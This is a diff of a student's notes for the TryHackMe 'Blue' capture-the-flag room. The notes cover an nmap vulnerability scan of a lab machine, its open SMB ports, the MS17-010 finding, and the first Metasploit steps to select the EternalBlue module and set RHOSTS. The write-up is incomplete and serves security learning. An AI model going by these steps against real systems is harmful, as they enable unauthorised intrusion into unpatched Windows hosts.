@@ -25,9 +25,10 @@ https://tryhackme.com/p/neogeo2484
 ### Room Blue
 
 
-Task 1-Scan and learn what exploit this machine is vulnerable to. Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up.
+_Task 1-Scan and learn what exploit this machine is vulnerable to. Please note that this machine does not _respond to ping (ICMP) and may take a few minutes to boot up._
 
-## Question 1: Scan the machine: 
+## Question 1: 
+Scan the machine: 
 
 ### Commands and Process:****
 apt install nmap 
@@ -36,17 +37,39 @@ nmap -Sv -SC--script vuln -oN blue.nmap 10.10.76.171
 less blue.nmap - Vulnerable MS12-020 Remote Desktop Protocol Denial of service IDss: CVE, CVE: 2012-0152 -medium , 2017-03-14 -High SMBV1 
 
 
-## Question 2 : 135 , 139 and 445 are 3 ports open under 1000 so 3 ports are open.
+## Question 2 : 
+135 , 139 and 445 are 3 ports open under 1000 so 3 ports are open.
 
-## Question 3 :  what is it vulnerable to High risk is ms17-010
-
-
-
-
-Task 2 
+## Question 3 : 
+what is it vulnerable the High risk is ms17-010
 
 
 
+
+_Task 2 Exploit the machine and gain a foothold._
+
+## question 1:
+_Start Metasploit_ 
+
+msfconsole
+
+## question 2:
+_Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)_
+
+search ms17
+
+search eternal - found that #2 matches : exploit /windows /smb/ms17_010_eternalblue 
+
+use 2 into command 
+
+## question 3:
+Show options and set the one required value. What is the name of this value? (All caps for submission)
+
+show options reveals the RHOSTS needs to be set_
+
+## question 4:
+U_sually it would be fine to run this exploit as is; however, for the sake of learning, you should do one more thing before exploiting the target. Enter the following command and press enter:
+With that done, run the exploit!_
 
 Task 3
 
@@ -54,6 +77,7 @@ Task 3
 
 
 Task 4 
+
 
 
 
